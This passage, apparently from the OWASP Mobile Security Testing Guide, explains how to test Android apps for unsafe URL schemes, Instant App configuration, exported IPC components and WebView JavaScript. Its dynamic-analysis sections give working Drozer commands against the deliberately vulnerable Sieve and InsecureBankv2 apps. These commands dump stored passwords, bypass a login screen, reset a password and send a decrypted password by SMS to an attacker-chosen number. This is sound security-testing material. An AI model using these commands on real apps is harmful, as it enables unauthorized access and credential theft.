  Using the data to do authenticated actions? Make sure that the user is
  in an authenticated state before the data is processed.
\item
  If tampering of the data will influence the result of the
  calculations: add an HMAC to the data.
\end{itemize}

\hypertarget{static-analysis-34}{%
\paragraph{Static Analysis}\label{static-analysis-34}}

Determine whether custom URL schemes are defined. This can be done in
the AndroidManifest.xml file, inside of an
\href{https://developer.android.com/guide/components/intents-filters.html\#DataTest}{intent-filter
element}.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<activity}\OtherTok{ android:name=}\StringTok{".MyUriActivity"}\KeywordTok{>}
  \KeywordTok{<intent{-}filter>}
      \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"android.intent.action.VIEW"} \KeywordTok{/>}
      \KeywordTok{<category}\OtherTok{ android:name=}\StringTok{"android.intent.category.DEFAULT"} \KeywordTok{/>}
      \KeywordTok{<category}\OtherTok{ android:name=}\StringTok{"android.intent.category.BROWSABLE"} \KeywordTok{/>}
      \KeywordTok{<data}\OtherTok{ android:scheme=}\StringTok{"myapp"}\OtherTok{ android:host=}\StringTok{"path"} \KeywordTok{/>}
  \KeywordTok{</intent{-}filter>}
\KeywordTok{</activity>}
\end{Highlighting}
\end{Shaded}

The example above specifies a new URL scheme called \texttt{myapp://}.
The category \texttt{browsable} will allow the URI to be opened within a
browser.

Data can then be transmitted through this new scheme with, for example,
the following URI:
\texttt{myapp://path/to/what/i/want?keyOne=valueOne\&keyTwo=valueTwo}.
Code like the following can be used to retrieve the data:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Intent intent = }\FunctionTok{getIntent}\NormalTok{();}
\KeywordTok{if}\NormalTok{ (Intent.}\FunctionTok{ACTION\_VIEW}\NormalTok{.}\FunctionTok{equals}\NormalTok{(intent.}\FunctionTok{getAction}\NormalTok{())) \{}
\NormalTok{  Uri uri = intent.}\FunctionTok{getData}\NormalTok{();}
  \BuiltInTok{String}\NormalTok{ valueOne = uri.}\FunctionTok{getQueryParameter}\NormalTok{(}\StringTok{"keyOne"}\NormalTok{);}
  \BuiltInTok{String}\NormalTok{ valueTwo = uri.}\FunctionTok{getQueryParameter}\NormalTok{(}\StringTok{"keyTwo"}\NormalTok{);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Verify the usage of
\href{https://developer.android.com/reference/android/content/Intent.html\#toUri\%28int\%29}{\texttt{toUri}},
which may also be used in this context.

\hypertarget{dynamic-analysis-31}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-31}}

To enumerate URL schemes within an app that can be called by a web
browser, use the Drozer module \texttt{scanner.activity.browsable}:

\begin{verbatim}
dz> run scanner.activity.browsable -a com.google.android.apps.messaging
Package: com.google.android.apps.messaging
  Invocable URIs:
    sms://
    mms://
  Classes:
    com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
\end{verbatim}

You can call custom URL schemes with the Drozer module
\texttt{app.activity.start}:

\begin{verbatim}
dz> run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"
\end{verbatim}

When used to call a defined schema
(myapp://someaction/?var0=string\&var1=string), the module may also be
used to send data to the app, as in the example below.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Intent intent = }\FunctionTok{getIntent}\NormalTok{();}
\KeywordTok{if}\NormalTok{ (Intent.}\FunctionTok{ACTION\_VIEW}\NormalTok{.}\FunctionTok{equals}\NormalTok{(intent.}\FunctionTok{getAction}\NormalTok{())) \{}
\NormalTok{  Uri uri = intent.}\FunctionTok{getData}\NormalTok{();}
  \BuiltInTok{String}\NormalTok{ valueOne = uri.}\FunctionTok{getQueryParameter}\NormalTok{(}\StringTok{"var0"}\NormalTok{);}
  \BuiltInTok{String}\NormalTok{ valueTwo = uri.}\FunctionTok{getQueryParameter}\NormalTok{(}\StringTok{"var1"}\NormalTok{);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Defining and using your own URL scheme can be risky in this situation if
data is sent to the scheme from an external party and processed in the
app. Therefore keep in mind that data should be validated as described
in ``Testing custom URL schemes''.

\hypertarget{testing-for-insecure-configuration-of-instant-apps-mstg-arch-1-mstg-arch-7}{%
\subsubsection{Testing for Insecure Configuration of Instant Apps
(MSTG-ARCH-1,
MSTG-ARCH-7)}\label{testing-for-insecure-configuration-of-instant-apps-mstg-arch-1-mstg-arch-7}}

\hypertarget{overview-28}{%
\paragraph{Overview}\label{overview-28}}

With
\href{https://developer.android.com/topic/google-play-instant/overview}{Google
Play Instant} you can now create Instant apps. An instant apps can be
instantly launched from a browser or the ``try now'' button from the app
store from Android 6.0 (API level 23) onward. They do not require any
form of installation. There are a few challenges with an instant app:

\begin{itemize}
\tightlist
\item
  There is a limited amount of size you can have with an instant app
  (max 10 mb).
\item
  Only a reduced number of permissions can be used, which are documented
  at
  \href{https://developer.android.com/topic/google-play-instant/getting-started/instant-enabled-app-bundle?tenant=irina\#request-supported-permissions}{Android
  Instant app documentation}.
\end{itemize}

The combination of these can lead to insecure decisions, such as:
stripping too much of the authorization/authentication/confidentiality
logic from an app, which allows for information leakage.

Note: Instant apps require an App Bundle. App Bundles are described in
the ``\href{0x05a-Platform-Overview.md\#app-bundles}{App Bundles}''
section of the ``Android Platform Overview'' chapter.

\hypertarget{static-analysis-35}{%
\paragraph{Static Analysis}\label{static-analysis-35}}

Static analysis can be either done after reverse engineering a
downloaded instant app, or by analyzing the App Bundle. When you analyze
the App Bundle, check the Android Manifest to see whether
\texttt{dist:module\ dist:instant="true"} is set for a given module
(either the base or a specific module with \texttt{dist:module} set).
Next, check for the various entry points, which entry points are set (by
means of
\texttt{\textless{}data\ android:path="\textless{}/PATH/HERE\textgreater{}"\ /\textgreater{}}).

Now follow the entry points, like you would do for any Activity and
check:

\begin{itemize}
\tightlist
\item
  Is there any data retrieved by the app which should require privacy
  protection of that data? If so, are all required controls in place?
\item
  Are all communications secured?
\item
  When you need more functionalities, are the right security controls
  downloaded as well?
\end{itemize}

\hypertarget{dynamic-analysis-32}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-32}}

There are multiple ways to start the dynamic analysis of your instant
app. In all cases, you will first have to install the support for
instant apps and add the \texttt{ia} executable to your \texttt{\$PATH}.

The installation of instant app support is taken care off through the
following command:

\begin{verbatim}
$ cd path/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps'
\end{verbatim}

Next, you have to add
\texttt{path/to/android/sdk/extras/google/instantapps/ia} to your
\texttt{\$PATH}.

After the preparation, you can test instant apps locally on a device
running Android 8.1 (API level 27) or later. The app can be tested in
different ways:

\begin{itemize}
\item
  Test the app locally: Deploy the app via Android Studio (and enable
  the \texttt{Deploy\ as\ instant\ app} checkbox in the
  Run/Configuration dialog) or deploy the app using the following
  command:

\begin{verbatim}
$ ia run output-from-build-command <app-artifact>
\end{verbatim}
\item
  Test the app using the Play Console:

  \begin{enumerate}
  \def\labelenumi{\arabic{enumi}.}
  \tightlist
  \item
    Upload your App Bundle to the Google Play Console
  \item
    Prepare the uploaded bundle for a release to the internal test
    track.
  \item
    Sign into an internal tester account on a device, then launch your
    instant experience from either an external prepared link or via the
    \texttt{try\ now} button in the App store from the testers account.
  \end{enumerate}
\end{itemize}

Now that you can test the app, check whether:

\begin{itemize}
\tightlist
\item
  There are any data which require privacy controls and whether these
  controls are in place.
\item
  All communications are sufficiently secured.
\item
  When you need more functionalities, are the right security controls
  downloaded as well for these functionalities?
\end{itemize}

\hypertarget{testing-for-sensitive-functionality-exposure-through-ipc-mstg-platform-4}{%
\subsubsection{Testing for Sensitive Functionality Exposure Through IPC
(MSTG-PLATFORM-4)}\label{testing-for-sensitive-functionality-exposure-through-ipc-mstg-platform-4}}

\hypertarget{overview-29}{%
\paragraph{Overview}\label{overview-29}}

During implementation of a mobile application, developers may apply
traditional techniques for IPC (such as using shared files or network
sockets). The IPC system functionality offered by mobile application
platforms should be used because it is much more mature than traditional
techniques. Using IPC mechanisms with no security in mind may cause the
application to leak or expose sensitive data.

The following is a list of Android IPC Mechanisms that may expose
sensitive data:

\begin{itemize}
\tightlist
\item
  \href{https://developer.android.com/reference/android/os/Binder.html}{Binders}
\item
  \href{https://developer.android.com/guide/components/services.html}{Services}
\item
  \href{https://developer.android.com/guide/components/bound-services.html}{Bound
  Services}
\item
  \href{https://developer.android.com/guide/components/aidl.html}{AIDL}
\item
  \href{https://developer.android.com/reference/android/content/Intent.html}{Intents}
\item
  \href{https://developer.android.com/reference/android/content/ContentProvider.html}{Content
  Providers}
\end{itemize}

\hypertarget{static-analysis-36}{%
\paragraph{Static Analysis}\label{static-analysis-36}}

We start by looking at the AndroidManifest.xml, where all activities,
services, and content providers included in the source code must be
declared (otherwise the system won't recognize them and they won't run).
Broadcast receivers can be declared in the manifest or created
dynamically. You will want to identify elements such as

\begin{itemize}
\tightlist
\item
  \href{https://developer.android.com/guide/topics/manifest/intent-filter-element.html}{\texttt{\textless{}intent-filter\textgreater{}}}
\item
  \href{https://developer.android.com/guide/topics/manifest/service-element.html}{\texttt{\textless{}service\textgreater{}}}
\item
  \href{https://developer.android.com/guide/topics/manifest/provider-element.html}{\texttt{\textless{}provider\textgreater{}}}
\item
  \href{https://developer.android.com/guide/topics/manifest/receiver-element.html}{\texttt{\textless{}receiver\textgreater{}}}
\end{itemize}

An ``exported'' activity, service, or content can be accessed by other
apps. There are two common ways to designate a component as exported.
The obvious one is setting the export tag to true
\texttt{android:exported="true"}. The second way involves defining an
\texttt{\textless{}intent-filter\textgreater{}} within the component
element (\texttt{\textless{}activity\textgreater{}},
\texttt{\textless{}service\textgreater{}},
\texttt{\textless{}receiver\textgreater{}}). When this is done, the
export tag is automatically set to ``true''. To prevent all other
Android apps from interacting with the IPC component element, be sure
that the \texttt{android:exported="true"} value and an
\texttt{\textless{}intent-filter\textgreater{}} aren't in their
\texttt{AndroidManifest.xml} files unless this is necessary.

Remember that using the permission tag (\texttt{android:permission})
will also limit other applications' access to a component. If your IPC
is intended to be accessible to other applications, you can apply a
security policy with the \texttt{\textless{}permission\textgreater{}}
element and set a proper \texttt{android:protectionLevel}. When
\texttt{android:permission} is used in a service declaration, other
applications must declare a corresponding
\texttt{\textless{}uses-permission\textgreater{}} element in their own
manifest to start, stop, or bind to the service.

For more information about the content providers, please refer to the
test case ``Testing Whether Stored Sensitive Data Is Exposed via IPC
Mechanisms'' in chapter ``Testing Data Storage''.

Once you identify a list of IPC mechanisms, review the source code to
see whether sensitive data is leaked when the mechanisms are used. For
example, content providers can be used to access database information,
and services can be probed to see if they return data. Broadcast
receivers can leak sensitive information if probed or sniffed.

In the following, we use two example apps and give examples of
identifying vulnerable IPC components:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk}{``Sieve''}
\item
  \href{https://github.com/dineshshetty/Android-InsecureBankv2}{``Android
  Insecure Bank''}
\end{itemize}

\hypertarget{activities-1}{%
\paragraph{Activities}\label{activities-1}}

\hypertarget{inspect-the-androidmanifest}{%
\subparagraph{Inspect the
AndroidManifest}\label{inspect-the-androidmanifest}}

In the ``Sieve'' app, we find three exported activities, identified by
\texttt{\textless{}activity\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<activity}\OtherTok{ android:excludeFromRecents=}\StringTok{"true"}\OtherTok{ android:label=}\StringTok{"@string/app\_name"}\OtherTok{ android:launchMode=}\StringTok{"singleTask"}\OtherTok{ android:name=}\StringTok{".MainLoginActivity"}\OtherTok{ android:windowSoftInputMode=}\StringTok{"adjustResize|stateVisible"}\KeywordTok{>}
    \KeywordTok{<intent{-}filter>}
        \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"android.intent.action.MAIN"} \KeywordTok{/>}
        \KeywordTok{<category}\OtherTok{ android:name=}\StringTok{"android.intent.category.LAUNCHER"} \KeywordTok{/>}
    \KeywordTok{</intent{-}filter>}
\KeywordTok{</activity>}
\KeywordTok{<activity}\OtherTok{ android:clearTaskOnLaunch=}\StringTok{"true"}\OtherTok{ android:excludeFromRecents=}\StringTok{"true"}\OtherTok{ android:exported=}\StringTok{"true"}\OtherTok{ android:finishOnTaskLaunch=}\StringTok{"true"}\OtherTok{ android:label=}\StringTok{"@string/title\_activity\_file\_select"}\OtherTok{ android:name=}\StringTok{".FileSelectActivity"} \KeywordTok{/>}
\KeywordTok{<activity}\OtherTok{ android:clearTaskOnLaunch=}\StringTok{"true"}\OtherTok{ android:excludeFromRecents=}\StringTok{"true"}\OtherTok{ android:exported=}\StringTok{"true"}\OtherTok{ android:finishOnTaskLaunch=}\StringTok{"true"}\OtherTok{ android:label=}\StringTok{"@string/title\_activity\_pwlist"}\OtherTok{ android:name=}\StringTok{".PWList"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

\hypertarget{inspect-the-source-code-1}{%
\subparagraph{Inspect the source code}\label{inspect-the-source-code-1}}

By inspecting the \texttt{PWList.java} activity, we see that it offers
options to list all keys, add, delete, etc. If we invoke it directly, we
will be able to bypass the LoginActivity. More on this can be found in
the dynamic analysis below.

\hypertarget{services-1}{%
\paragraph{Services}\label{services-1}}

\hypertarget{inspect-the-androidmanifest-1}{%
\subparagraph{Inspect the
AndroidManifest}\label{inspect-the-androidmanifest-1}}

In the ``Sieve'' app, we find two exported services, identified by
\texttt{\textless{}service\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<service}\OtherTok{ android:exported=}\StringTok{"true"}\OtherTok{ android:name=}\StringTok{".AuthService"}\OtherTok{ android:process=}\StringTok{":remote"} \KeywordTok{/>}
\KeywordTok{<service}\OtherTok{ android:exported=}\StringTok{"true"}\OtherTok{ android:name=}\StringTok{".CryptoService"}\OtherTok{ android:process=}\StringTok{":remote"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

\hypertarget{inspect-the-source-code-2}{%
\subparagraph{Inspect the source code}\label{inspect-the-source-code-2}}

Check the source code for the class \texttt{android.app.Service}:

By reversing the target application, we can see that the service
\texttt{AuthService} provides functionality for changing the password
and PIN-protecting the target app.

\begin{Shaded}
\begin{Highlighting}[]
   \KeywordTok{public} \DataTypeTok{void} \FunctionTok{handleMessage}\NormalTok{(Message msg) \{}
\NormalTok{            AuthService.}\FunctionTok{this}\NormalTok{.}\FunctionTok{responseHandler}\NormalTok{ = msg.}\FunctionTok{replyTo}\NormalTok{;}
\NormalTok{            Bundle returnBundle = msg.}\FunctionTok{obj}\NormalTok{;}
            \DataTypeTok{int}\NormalTok{ responseCode;}
            \DataTypeTok{int}\NormalTok{ returnVal;}
            \KeywordTok{switch}\NormalTok{ (msg.}\FunctionTok{what}\NormalTok{) \{}
\NormalTok{                ...}
                \KeywordTok{case}\NormalTok{ AuthService.}\FunctionTok{MSG\_SET} \CommentTok{/*6345*/}\NormalTok{:}
                    \KeywordTok{if}\NormalTok{ (msg.}\FunctionTok{arg1}\NormalTok{ == AuthService.}\FunctionTok{TYPE\_KEY}\NormalTok{) }\CommentTok{/*7452*/}\NormalTok{ \{}
\NormalTok{                        responseCode = }\DecValTok{42}\NormalTok{;}
                        \KeywordTok{if}\NormalTok{ (AuthService.}\FunctionTok{this}\NormalTok{.}\FunctionTok{setKey}\NormalTok{(returnBundle.}\FunctionTok{getString}\NormalTok{(}\StringTok{"com.mwr.example.sieve.PASSWORD"}\NormalTok{))) \{}
\NormalTok{                            returnVal = }\DecValTok{0}\NormalTok{;}
\NormalTok{                        \} }\KeywordTok{else}\NormalTok{ \{}
\NormalTok{                            returnVal = }\DecValTok{1}\NormalTok{;}
\NormalTok{                        \}}
\NormalTok{                    \} }\KeywordTok{else} \KeywordTok{if}\NormalTok{ (msg.}\FunctionTok{arg1}\NormalTok{ == AuthService.}\FunctionTok{TYPE\_PIN}\NormalTok{) \{}
\NormalTok{                        responseCode = }\DecValTok{41}\NormalTok{;}
                        \KeywordTok{if}\NormalTok{ (AuthService.}\FunctionTok{this}\NormalTok{.}\FunctionTok{setPin}\NormalTok{(returnBundle.}\FunctionTok{getString}\NormalTok{(}\StringTok{"com.mwr.example.sieve.PIN"}\NormalTok{))) \{}
\NormalTok{                            returnVal = }\DecValTok{0}\NormalTok{;}
\NormalTok{                        \} }\KeywordTok{else}\NormalTok{ \{}
\NormalTok{                            returnVal = }\DecValTok{1}\NormalTok{;}
\NormalTok{                        \}}
\NormalTok{                    \} }\KeywordTok{else}\NormalTok{ \{}
                        \FunctionTok{sendUnrecognisedMessage}\NormalTok{();}
                        \KeywordTok{return}\NormalTok{;}
\NormalTok{                    \}}
\NormalTok{           \}}
\NormalTok{   \}}
\end{Highlighting}
\end{Shaded}

\hypertarget{broadcast-receivers-1}{%
\subparagraph{Broadcast Receivers}\label{broadcast-receivers-1}}

\hypertarget{inspect-the-androidmanifest-2}{%
\subparagraph{Inspect the
AndroidManifest}\label{inspect-the-androidmanifest-2}}

In the ``Android Insecure Bank'' app, we find a broadcast receiver in
the manifest, identified by \texttt{\textless{}receiver\textgreater{}}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<receiver}\OtherTok{ android:exported=}\StringTok{"true"}\OtherTok{ android:name=}\StringTok{"com.android.insecurebankv2.MyBroadCastReceiver"}\KeywordTok{>}
    \KeywordTok{<intent{-}filter>}
        \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"theBroadcast"} \KeywordTok{/>}
    \KeywordTok{</intent{-}filter>}
\KeywordTok{</receiver>}
\end{Highlighting}
\end{Shaded}

\hypertarget{inspect-the-source-code-3}{%
\subparagraph{Inspect the source code}\label{inspect-the-source-code-3}}

Search the source code for strings like \texttt{sendBroadcast},
\texttt{sendOrderedBroadcast}, and \texttt{sendStickyBroadcast}. Make
sure that the application doesn't send any sensitive data.

If an Intent is broadcasted and received within the application only,
\texttt{LocalBroadcastManager} can be used to prevent other apps from
receiving the broadcast message. This reduces the risk of leaking
sensitive information.

To understand more about what the receiver is intended to do, we have to
go deeper in our static analysis and search for usage of the class
\texttt{android.content.BroadcastReceiver} and the
\texttt{Context.registerReceiver} method, which is used to dynamically
create receivers.

The following extract of the target application's source code shows that
the broadcast receiver triggers transmission of an SMS message
containing the user's decrypted password.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyBroadCastReceiver }\KeywordTok{extends}\NormalTok{ BroadcastReceiver \{}
  \BuiltInTok{String}\NormalTok{ usernameBase64ByteString;}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ MYPREFS = }\StringTok{"mySharedPreferences"}\NormalTok{;}

  \AttributeTok{@Override}
  \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onReceive}\NormalTok{(}\BuiltInTok{Context}\NormalTok{ context, Intent intent) \{}
    \CommentTok{// }\AlertTok{TODO}\CommentTok{ Auto{-}generated method stub}

        \BuiltInTok{String}\NormalTok{ phn = intent.}\FunctionTok{getStringExtra}\NormalTok{(}\StringTok{"phonenumber"}\NormalTok{);}
        \BuiltInTok{String}\NormalTok{ newpass = intent.}\FunctionTok{getStringExtra}\NormalTok{(}\StringTok{"newpass"}\NormalTok{);}

    \KeywordTok{if}\NormalTok{ (phn != }\KeywordTok{null}\NormalTok{) \{}
      \KeywordTok{try}\NormalTok{ \{}
\NormalTok{                SharedPreferences settings = context.}\FunctionTok{getSharedPreferences}\NormalTok{(MYPREFS, }\BuiltInTok{Context}\NormalTok{.}\FunctionTok{MODE\_WORLD\_READABLE}\NormalTok{);}
                \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ username = settings.}\FunctionTok{getString}\NormalTok{(}\StringTok{"EncryptedUsername"}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
                \DataTypeTok{byte}\NormalTok{[] usernameBase64Byte = Base64.}\FunctionTok{decode}\NormalTok{(username, Base64.}\FunctionTok{DEFAULT}\NormalTok{);}
\NormalTok{                usernameBase64ByteString = }\KeywordTok{new} \BuiltInTok{String}\NormalTok{(usernameBase64Byte, }\StringTok{"UTF{-}8"}\NormalTok{);}
                \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ password = settings.}\FunctionTok{getString}\NormalTok{(}\StringTok{"superSecurePassword"}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\NormalTok{                CryptoClass crypt = }\KeywordTok{new} \FunctionTok{CryptoClass}\NormalTok{();}
                \BuiltInTok{String}\NormalTok{ decryptedPassword = crypt.}\FunctionTok{aesDeccryptedString}\NormalTok{(password);}
                \BuiltInTok{String}\NormalTok{ textPhoneno = phn.}\FunctionTok{toString}\NormalTok{();}
                \BuiltInTok{String}\NormalTok{ textMessage = }\StringTok{"Updated Password from: "}\NormalTok{+decryptedPassword+}\StringTok{" to: "}\NormalTok{+newpass;}
\NormalTok{                SmsManager smsManager = SmsManager.}\FunctionTok{getDefault}\NormalTok{();}
                \BuiltInTok{System}\NormalTok{.}\FunctionTok{out}\NormalTok{.}\FunctionTok{println}\NormalTok{(}\StringTok{"For the changepassword {-} phonenumber: "}\NormalTok{+textPhoneno+}\StringTok{" password is: "}\NormalTok{+textMessage);}
\NormalTok{smsManager.}\FunctionTok{sendTextMessage}\NormalTok{(textPhoneno, }\KeywordTok{null}\NormalTok{, textMessage, }\KeywordTok{null}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\NormalTok{          \}}
\NormalTok{     \}}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

BroadcastReceivers should use the \texttt{android:permission} attribute;
otherwise, other applications can invoke them. You can use
\texttt{Context.sendBroadcast(intent,\ receiverPermission);} to specify
permissions a receiver must have to \href{https://goo.gl/ViRYPC}{read
the broadcast}. You can also set an explicit application package name
that limits the components this Intent will resolve to. If left as the
default value (null), all components in all applications will be
considered. If non-null, the Intent can match only the components in the
given application package.

\hypertarget{dynamic-analysis-33}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-33}}

You can enumerate IPC components with Drozer. To list all exported IPC
components, use the module \texttt{app.package.attacksurface}:

\begin{verbatim}
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable
\end{verbatim}

\hypertarget{content-providers-1}{%
\subparagraph{Content Providers}\label{content-providers-1}}

The ``Sieve'' application implements a vulnerable content provider. To
list the content providers exported by the Sieve app, execute the
following command:

\begin{verbatim}
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys
\end{verbatim}

Content providers with names like ``Passwords'' and ``Keys'' are prime
suspects for sensitive information leaks. After all, it wouldn't be good
if sensitive keys and passwords could simply be queried from the
provider!

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
\end{verbatim}

\begin{verbatim}
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password          | pin  |
| SuperPassword1234 | 1234 |
\end{verbatim}

This content provider can be accessed without permission.

\begin{verbatim}
dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "newpassword"
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password    | pin  |
| newpassword | 1234 |
\end{verbatim}

\hypertarget{activities-2}{%
\subparagraph{Activities}\label{activities-2}}

To list activities exported by an application, use the module
\texttt{app.activity.info}. Specify the target package with \texttt{-a}
or omit the option to target all apps on the device:

\begin{verbatim}
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList
    Permission: null  
\end{verbatim}

Enumerating activities in the vulnerable password manager ``Sieve''
shows that the activity \texttt{com.mwr.example.sieve.PWList} is
exported with no required permissions. It is possible to use the module
\texttt{app.activity.start} to launch this activity.

\begin{verbatim}
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
\end{verbatim}

Since the activity is called directly in this example, the login form
protecting the password manager would be bypassed, and the data
contained within the password manager could be accessed.

\hypertarget{services-2}{%
\subparagraph{Services}\label{services-2}}

Services can be enumerated with the Drozer module
\texttt{app.service.info}:

\begin{verbatim}
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
\end{verbatim}

To communicate with a service, you must first use static analysis to
identify the required inputs.

Because this service is exported, you can use the module
\texttt{app.service.send} to communicate with the service and change the
password stored in the target application:

\begin{verbatim}
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
  what: 4
  arg1: 42
  arg2: 0
  Empty
\end{verbatim}

\hypertarget{broadcast-receivers-2}{%
\subparagraph{Broadcast Receivers}\label{broadcast-receivers-2}}

Broadcasts can be enumerated via the Drozer module
\texttt{app.broadcast.info}. The target package should be specified via
the \texttt{-a} parameter:

\begin{verbatim}
dz> run app.broadcast.info -a com.android.insecurebankv2
Package: com.android.insecurebankv2
  com.android.insecurebankv2.MyBroadCastReceiver
    Permission: null
\end{verbatim}

In the example app ``Android Insecure Bank'', one broadcast receiver is
exported without requiring any permissions, indicating that we can
formulate an intent to trigger the broadcast receiver. When testing
broadcast receivers, you must also use static analysis to understand the
functionality of the broadcast receiver, as we did before.

With the Drozer module \texttt{app.broadcast.send}, we can formulate an
intent to trigger the broadcast and send the password to a phone number
within our control:

\begin{verbatim}
dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
\end{verbatim}

This generates the following SMS:

\begin{verbatim}
Updated Password from: SecretPassword@ to: 12345
\end{verbatim}

Sniffing Intents

If an Android application broadcasts intents without setting a required
permission or specifying the destination package, the intents can be
monitored by any application that runs on the device.

To register a broadcast receiver to sniff intents, use the Drozer module
\texttt{app.broadcast.sniff} and specify the action to monitor with the
\texttt{-\/-action} parameter:

\begin{verbatim}
dz> run app.broadcast.sniff  --action theBroadcast
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.

Action: theBroadcast
Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
Extra: phonenumber=07123456789 (java.lang.String)
Extra: newpass=12345 (java.lang.String)`
\end{verbatim}

\hypertarget{testing-javascript-execution-in-webviews-mstg-platform-5}{%
\subsubsection{Testing JavaScript Execution in WebViews
(MSTG-PLATFORM-5)}\label{testing-javascript-execution-in-webviews-mstg-platform-5}}

\hypertarget{overview-30}{%
\paragraph{Overview}\label{overview-30}}

JavaScript can be injected into web applications via reflected, stored,
or DOM-based Cross-Site Scripting (XSS). Mobile apps are executed in a
sandboxed environment and don't have this vulnerability when implemented
natively. Nevertheless, WebViews may be part of a native app to allow
web page viewing. Every app has its own WebView cache, which isn't
shared with the native Browser or other apps. On Android, WebViews use
the WebKit rendering engine to display web pages, but the pages are
stripped down to minimal functions, for example, pages don't have
address bars. If the WebView implementation is too lax and allows usage
of JavaScript, JavaScript can be used to attack the app and gain access
to its data.

\hypertarget{static-analysis-37}{%
\paragraph{Static Analysis}\label{static-analysis-37}}

The source code must be checked for usage and implementations of the
WebView class. To create and use a WebView, you must create an instance
of the WebView class.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{WebView webview = }\KeywordTok{new} \FunctionTok{WebView}\NormalTok{(}\KeywordTok{this}\NormalTok{);}
\FunctionTok{setContentView}\NormalTok{(webview);}
\NormalTok{webview.}\FunctionTok{loadUrl}\NormalTok{(}\StringTok{"https://www.owasp.org/"}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

Various settings can be applied to the WebView (activating/deactivating
JavaScript is one example). JavaScript is disabled by default for
WebViews and must be explicitly enabled. Look for the method
\href{https://goo.gl/G9spo2}{\texttt{setJavaScriptEnabled}} to check for
JavaScript activation.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{webview.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setJavaScriptEnabled}\NormalTok{(}\KeywordTok{true}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

This allows the WebView to interpret JavaScript. It should be enabled
only if necessary to reduce the attack surface to the app. If JavaScript
is necessary, you should make sure that

\begin{itemize}
\tightlist
\item
  The communication to the endpoints consistently relies on HTTPS (or
  other protocols that allow encryption) to protect HTML and JavaScript
  from tampering during transmission.
\item
  JavaScript and HTML are loaded locally, from within the app data
  directory or from trusted web servers only.
\item
  The user cannot define which sources to load by means of loading
  different resources based on a user provided input.
\end{itemize}

To remove all JavaScript source code and locally stored data, clear the
WebView's cache with \href{https://goo.gl/7dnhdi}{\texttt{clearCache}}
when the app closes.

Devices running platforms older than Android 4.4 (API level 19) use a
version of WebKit that has several security issues. As a workaround, the
app must confirm that WebView objects
\href{https://developer.android.com/training/articles/security-tips.html\#WebView}{display
only trusted content} if the app runs on these devices.

\hypertarget{dynamic-analysis-34}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-34}}

Dynamic Analysis depends on operating conditions. There are several ways
